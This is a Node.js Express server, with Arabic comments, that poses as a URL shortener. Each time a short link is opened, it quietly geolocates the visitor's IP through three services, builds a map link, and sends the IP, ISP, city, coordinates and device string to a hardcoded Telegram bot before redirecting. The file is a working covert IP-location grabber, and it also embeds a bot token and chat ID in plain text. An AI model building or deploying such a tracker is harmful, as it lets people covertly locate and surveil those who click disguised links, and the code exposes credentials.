const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
const geoip = require('geoip-lite');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function getLocationFromMultipleSources(ip) {
  let results = {
    ipwhois: null,
    ipapi: null,
    geoiplite: null
  };

  // الطريقة 1: ipwhois
  try {
    const res = await axios.get(`https://ipwhois.app/json/${ip}`, { timeout: 3000 });
    results.ipwhois = {
      country: res.data.country,
      city: res.data.city,
      region: res.data.region,
      latitude: res.data.latitude,
      longitude: res.data.longitude,
      isp: res.data.isp,
      type: 'ipwhois'
    };
  } catch (err) {
    console.log('ipwhois error');
  }

  // الطريقة 2: ip-api.com
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
    if (res.data.status === 'success') {
      results.ipapi = {
        country: res.data.country,
        city: res.data.city,
        region: res.data.regionName,
        latitude: res.data.lat,
        longitude: res.data.lon,
        isp: res.data.isp,
        type: 'ip-api'
      };
    }
  } catch (err) {
    console.log('ip-api error');
  }

  // الطريقة 3: geoip-lite (محلي)
  try {
    const geo = geoip.lookup(ip);
    if (geo) {
      results.geoiplite = {
        country: geo.country,
        city: 'N/A',
        region: 'N/A',
        latitude: geo.ll ? geo.ll[0] : 'N/A',
        longitude: geo.ll ? geo.ll[1] : 'N/A',
        isp: 'N/A',
        type: 'geoip-lite'
      };
    }
  } catch (err) {
    console.log('geoip-lite error');
  }

  return results;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
  try {
    const locations = await getLocationFromMultipleSources(ip);

    // استخدام أفضل مصدر متاح
    let location = locations.ipwhois || locations.ipapi || locations.geoiplite;
    
    if (!location) {
      location = {
        country: 'غير معروف',
        city: 'غير معروف',
        region: 'غير معروف',
        latitude: 'N/A',
        longitude: 'N/A',
        isp: 'غير معروف',
        type: 'معلومات غير متاحة'
      };
    }

    const lat = location.latitude;
    const lng = location.longitude;
    const mapsUrl = (lat !== 'N/A' && lng !== 'N/A') 
      ? `https://maps.google.com/?q=${lat},${lng}` 
      : 'N/A';

    const message = `
🔗 رابط جديد تم فتحه!
━━━━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
━━━━━━━━━━━━━━
🔌 IP Address: ${ip}
🌍 ISP: ${location.isp || 'N/A'}
🏳️ الدولة: ${location.country || 'N/A'}
🏙️ المدينة: ${location.city || 'N/A'}
🗺️ المنطقة: ${location.region || 'N/A'}
━━━━━━━━━━━━━━
📊 دائرة العرض: ${lat}
📊 خط الطول: ${lng}
🗺️ الموقع على الخريطة: ${mapsUrl}
📡 مصدر البيانات: ${location.type}
━━━━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 60)}
⏰ الوقت: ${new Date().toISOString()}
  `.trim();

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: message }
    );
  } catch (err) {
    console.error('Telegram error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: 'الرابط مطلوب' });
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = {
    original: url,
    created: new Date(),
    clicks: 0
  };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('الرابط غير موجود');
  }

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;
  sendToTelegram(ip, code, originalUrl, userAgent);

  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});